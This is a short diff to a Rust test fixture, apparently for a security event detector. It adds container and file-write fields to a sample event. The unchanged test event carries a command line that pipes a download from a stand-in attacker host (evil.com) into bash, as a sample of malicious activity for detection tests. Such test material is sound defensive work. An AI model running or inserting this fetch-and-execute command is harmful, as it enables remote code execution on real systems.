@@ -481,11 +481,17 @@ mod tests {
             parent_process: "sshd".to_string(),
             session_id: 1,
             file_path: None,
+            file_write: false,
             file_hash: None,
             dst_port,
             dst_ip: None,
             dst_domain: None,
             command_line: Some("curl http://evil.com | bash".to_string()),
+            event_size: None,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
         }
     }
 
